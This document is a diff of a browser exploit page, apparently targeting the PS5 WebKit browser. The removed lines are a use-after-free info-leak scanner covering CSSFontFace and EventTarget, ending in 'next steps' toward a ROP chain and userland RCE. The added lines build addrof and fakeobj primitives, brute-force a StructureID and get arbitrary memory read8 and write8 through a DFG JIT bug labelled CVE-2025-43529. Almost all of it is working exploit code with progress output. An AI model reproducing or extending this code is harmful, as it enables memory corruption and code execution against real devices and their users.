-                    else if (props[i] === "nodeType" && val !== 9) {
-                        unusual = true;
-                        Hi("  [+] " + props[i] + " = " + val + " ← EXPECTED 9");
-                    }
-                    else if (props[i] === "URL" && val !== "about:blank") {
-                        unusual = true;
-                        Hi("  [+] " + props[i] + " = " + val + " ← EXPECTED about:blank");
-                    }
-                    else if (props[i] === "readyState" && val !== "complete") {
-                        unusual = true;
-                        Hi("  [+] " + props[i] + " = " + val + " ← EXPECTED complete");
-                    }
-                    else if (props[i] === "characterSet" && val !== "UTF-8") {
-                        unusual = true;
-                        Hi("  [+] " + props[i] + " = " + val + " ← EXPECTED UTF-8");
-                    }
-                    else if (props[i] === "contentType" && val !== "text/html") {
-                        unusual = true;
-                        Hi("  [+] " + props[i] + " = " + val + " ← EXPECTED text/html");
-                    }
-                    
-                    if (unusual) unusualCount++;
-                    else P("  [-] " + props[i] + " = " + str, "dm");
-                    
-                } catch(e) {
-                    P("  [!] " + props[i] + " error: " + e.message, "er");
-                }
-            }
-            
-            // Additional probes
-            P("\n  Additional probes:", "hd");
-            
-            try {
-                var ts = lockedDocumentRef.toString();
-                P("  toString: " + ts, "dm");
-                if (ts !== "[object HTMLDocument]") {
-                    Hi("  UNUSUAL toString!");
-                    if (Mem.hasRawMemory(ts)) {
-                        P("  toString hex: " + Mem.strToHex(ts, 64), "hl");
-                    }
-                }
-            } catch(e) { P("  toString error: " + e.message, "er"); }
-            
-            try {
-                var keys = Object.keys(lockedDocumentRef);
-                P("  Object.keys: " + keys.join(", "), "dm");
-            } catch(e) { P("  Object.keys error: " + e.message, "er"); }
-            
-            try {
-                var names = Object.getOwnPropertyNames(lockedDocumentRef);
-                P("  getOwnPropertyNames: " + names.join(", "), "dm");
-            } catch(e) { P("  getOwnPropertyNames error: " + e.message, "er"); }
-            
-            try {
-                var ownKeys = Reflect.ownKeys(lockedDocumentRef);
-                P("  Reflect.ownKeys: " + ownKeys.join(", "), "dm");
-            } catch(e) { P("  Reflect.ownKeys error: " + e.message, "er"); }
-            
-            try {
-                var proto = Object.getPrototypeOf(lockedDocumentRef);
-                P("  prototype: " + proto, "dm");
-            } catch(e) { P("  prototype error: " + e.message, "er"); }
-            
-            // Try to access the document's internal data via methods
-            P("\n  Method probes:", "hd");
-            
-            try {
-                var elem = lockedDocumentRef.createElement("div");
-                P("  createElement: " + elem, "dm");
-            } catch(e) { P("  createElement error: " + e.message, "er"); }
-            
-            try {
-                var txt = lockedDocumentRef.createTextNode("test");
-                P("  createTextNode: " + txt, "dm");
-            } catch(e) { P("  createTextNode error: " + e.message, "er"); }
-            
-            try {
-                var elById = lockedDocumentRef.getElementById("test");
-                P("  getElementById: " + elById, "dm");
-            } catch(e) { P("  getElementById error: " + e.message, "er"); }
-            
-            // Summary
-            P("\n  EventTarget Third Listener Summary:", "hd");
-            P("  Total properties checked: " + totalProps);
-            P("  Unusual values: " + unusualCount, unusualCount > 0 ? "hl" : "dm");
-            P("  Pointer leaks: " + etPointerLeaks.length, etPointerLeaks.length > 0 ? "hl" : "dm");
-            P("  Raw memory leaks: " + etRawLeaks.length, etRawLeaks.length > 0 ? "hl" : "dm");
-            P("  ROP gadgets: " + etGadgets.length, etGadgets.length > 0 ? "hl" : "dm");
-            
-            if (unusualCount > 0 || etPointerLeaks.length > 0 || etRawLeaks.length > 0) {
-                St("  ★ INFO LEAK DETECTED VIA lockedDocumentRef! ★");
-            } else {
-                P("  No unusual values — C++ Document may still be alive", "wr");
-                P("  (lockedDocumentRef prevents GC from freeing it)", "wr");
-            }
-        });
-        
-        // Dispatch
-        P("  Dispatching event 'b'...\n", "dm");
-        b2.dispatchEvent(new Event('b', { bubbles: true }));
-        
-        P("\n  [+] Browser survived!", "ok");
-        
-    } catch(e) {
-        Fl("  EventTarget error: " + e.message);
-    }
-    
-    // ============================================================
-    // PHASE 6: FINAL CONSOLIDATED SUMMARY
-    // ============================================================
-    P("");
-    Sep();Hd("PHASE 6: Final Consolidated Summary");Sep();
-    P("");
-    
-    var totalPointers = pointerLeaks.length + etPointerLeaks.length;
-    var totalRaw = rawMemoryLeaks.length + etRawLeaks.length;
-    var totalGadgets = gadgetFindings.length + etGadgets.length;
-    
-    P("  ╔═══════════════════════════════════════════════════╗");
-    P("  ║  CSSFontFace UAF: ✅ STABLE (17+ channels)        ║");
-    P("  ║  Confusion: ✅ ALIVE                               ║");
-    P("  ║  m_wrapper offset: ✅ 0x80 (confirmed)             ║");
-    P("  ║  wrapper() trigger: ✅ WORKING                     ║");
-    P("  ║                                                    ║");
-    P("  ║  CSSFontFace Scanner (corrected isPointer):        ║");
-    P("  ║    Pointer leaks: " + pointerLeaks.length + "                                ║");
-    P("  ║    Raw memory: " + rawMemoryLeaks.length + "                                   ║");
-    P("  ║    ROP gadgets: " + gadgetFindings.length + "                                   ║");
-    P("  ║                                                    ║");
-    P("  ║  EventTarget UAF (lockedDocumentRef):              ║");
-    P("  ║    Pointer leaks: " + etPointerLeaks.length + "                                ║");
-    P("  ║    Raw memory: " + etRawLeaks.length + "                                   ║");
-    P("  ║    ROP gadgets: " + etGadgets.length + "                                   ║");
-    P("  ║                                                    ║");
-    P("  ║  TOTAL LEAKS: " + (totalPointers + totalRaw) + "                                   ║");
-    P("  ║  TOTAL GADGETS: " + totalGadgets + "                                     ║");
-    P("  ╚═══════════════════════════════════════════════════╝");
-    P("");
-    
-    if (totalPointers > 0 || totalRaw > 0) {
-        St("★ INFO LEAK CONFIRMED — ASLR CAN BE DEFEATED ★");
-        P("");
-        P("  All leaked data:","hd");
-        
-        if (pointerLeaks.length > 0) {
-            P("  CSSFontFace pointer leaks:","hd");
-            for (var i = 0; i < pointerLeaks.length; i++) {
-                P("    " + pointerLeaks[i].ptrHex + " (" + pointerLeaks[i].source + ")");
-            }
-        }
-        if (etPointerLeaks.length > 0) {
-            P("  EventTarget pointer leaks:","hd");
-            for (var i = 0; i < etPointerLeaks.length; i++) {
-                P("    " + etPointerLeaks[i].hex + " (" + etPointerLeaks[i].prop + ")");
-            }
-        }
-        if (rawMemoryLeaks.length > 0) {
-            P("  CSSFontFace raw memory:","hd");
-            for (var i = 0; i < rawMemoryLeaks.length; i++) {
-                P("    source: " + rawMemoryLeaks[i].source);
-                P("    hex: " + rawMemoryLeaks[i].hex.substring(0, 48));
-            }
-        }
-        if (etRawLeaks.length > 0) {
-            P("  EventTarget raw memory:","hd");
-            for (var i = 0; i < etRawLeaks.length; i++) {
-                P("    prop: " + etRawLeaks[i].prop);
-                P("    hex: " + etRawLeaks[i].hex.substring(0, 48));
-            }
-        }
-        
-        P("");
-        Hi("  NEXT STEPS:");
-        Hi("  1. Calculate WebKit base from leaked pointer");
-        Hi("  2. Scan .text for ROP gadgets (if XOM allows)");
-        Hi("  3. Build ROP chain");
-        Hi("  4. Execute Userland RCE");
-    } else if (totalGadgets > 0) {
-        St("★ ROP GADGETS FOUND IN LEAKED MEMORY ★");
-        P("  Gadgets can be used for ROP chain construction");
+
+    if (!win) {
+        Fl("No overlap after 100 attempts");
+        Hi("This means DFG is NOT active on PS5.");
+        Hi("CVE-2025-43529 is impossible without JIT.");
+        Hi("Returning to CSSFontFace + EventTarget approach.");
     } else {
-        P("  No leaks or gadgets detected.","wr");
-        P("  Both CSSFontFace and EventTarget returned clean values.","wr");
-        P("");
-        P("  Assessment:","hd");
-        P("  - CSSFontFace getter returns clean strings (CSSOM validates)");
-        P("  - lockedDocumentRef keeps JS wrapper alive → C++ Document not freed");
-        P("  - Need alternative approach to trigger info leak","wr");
+        St("OVERLAP FOUND! DFG IS ACTIVE!");
+        
+        // Build addrof/fakeobj
+        var ab = new ArrayBuffer(8);
+        var u64 = new BigUint64Array(ab);
+        var f64 = new Float64Array(ab);
+        function i2f(v) { u64[0] = v; return f64[0]; }
+        function f2i(f) { f64[0] = f; return u64[0]; }
+        
+        function addrof(obj) { ba[0] = obj; return f2i(ua[0]); }
+        function fakeobj(addr) { ua[0] = i2f(addr); return ba[0]; }
+        
+        var t = { x: 1.1 };
+        var ta = addrof(t);
+        Ok("addrof(t) = 0x" + ta.toString(16));
+        
+        // Build read8/write8
+        Hi("Building read8/write8...");
+        
+        var sp = [];
+        for (var i = 0; i < 500; ++i) sp.push({ p1: 1.1, p2: 2.2 });
+        
+        var oA = null, oAa = 0n;
+        for (var i = 1; i < sp.length; ++i) {
+            var prev = addrof(sp[i-1]);
+            var curr = addrof(sp[i]);
+            if (curr - prev === 0x20n) {
+                oA = sp[i-1];
+                oAa = prev;
+                Ok("Adjacent pair at 0x" + oAa.toString(16));
+                break;
+            }
+        }
+        
+        if (!oA) { Fl("No pair found"); throw "No pair"; }
+        
+        var fa = fakeobj(oAa + 0x10n);
+        var kn = [13.37, 2.2, 3.3, 4.4];
+        var kna = addrof(kn);
+        Ok("Known array at 0x" + kna.toString(16));
+        
+        Hi("Brute forcing StructureID...");
+        var fs = false, fc = 0n, fo = 0n;
+        var offs = [0x00n, 0x08n, 0x10n, 0x18n, 0x20n, 0x28n, 0x30n];
+        
+        for (var sid = 0; sid < 512 && !fs; ++sid) {
+            var cv = BigInt(sid) | 0x0024070000000000n;
+            try {
+                oA.p1 = i2f(cv);
+                for (var oi = 0; oi < offs.length; ++oi) {
+                    oA.p2 = i2f(kna + offs[oi]);
+                    try {
+                        var v = fa[0];
+                        if (v === 13.37) {
+                            fs = true; fc = cv; fo = offs[oi];
+                            St("FOUND SID=" + sid + " OFF=0x" + fo.toString(16));
+                            break;
+                        }
+                    } catch(e2) {}
+                }
+            } catch(e) {}
+        }
+        
+        if (!fs) {
+            // Try alternate types
+            var alts = [0x002403n, 0x002406n, 0x002408n];
+            for (var ti = 0; ti < alts.length && !fs; ++ti) {
+                for (var sid = 0; sid < 512 && !fs; ++sid) {
+                    var cv = BigInt(sid) | (alts[ti] << 32n);
+                    try {
+                        oA.p1 = i2f(cv);
+                        for (var oi = 0; oi < offs.length; ++oi) {
+                            oA.p2 = i2f(kna + offs[oi]);
+                            try {
+                                var v = fa[0];
+                                if (typeof v === 'number' && v === 13.37) {
+                                    fs = true; fc = cv; fo = offs[oi];
+                                    St("FOUND T=" + ti + " SID=" + sid + " OFF=0x" + fo.toString(16));
+                                    break;
+                                }
+                            } catch(e2) {}
+                        }
+                    } catch(e) {}
+                }
+            }
+        }
+        
+        if (!fs) { Fl("No structure found"); throw "No structure"; }
+        
+        oA.p1 = i2f(fc);
+        
+        function read8(addr) { oA.p2 = i2f(addr); return f2i(fa[0]); }
+        function write8(addr, val) { oA.p2 = i2f(addr); fa[0] = i2f(val); }
+        
+        // Test
+        var jsc = read8(kna);
+        Ok("read8(kna) = 0x" + jsc.toString(16));
+        
+        var bp = read8(kna + 0x08n);
+        Ok("butterfly = 0x" + bp.toString(16));
+        
+        var e0 = read8(bp);
+        Ok("elem[0] = " + i2f(e0) + " (expect 13.37)");
+        
+        write8(bp, f2i(99.99));
+        Ok("write8: kn[0] = " + kn[0] + " (expect 99.99)");
+        
+        St("=== EXPLOIT COMPLETE ===");
+        Ok("addrof:  ✅");
+        Ok("fakeobj: ✅");
+        Ok("read8:   ✅");
+        Ok("write8:  ✅");
+        Ok("StructureID: 0x" + fc.toString(16));
+        
+        Hi("Total time: " + (Date.now() - triggerStart) + "ms");
     }
-    
-    P("");
-    St("★ v63 CORRECTED SCANNER COMPLETE ★");
-    
-}).catch(function(e) {
-    Fl("Phase 2 crash: " + e.message);
-});
+
+} catch(e) {
+    Fl("ERROR: " + e);
+    p("Stack: " + (e.stack || ""));
+}
 </script>
 </body>
 </html>
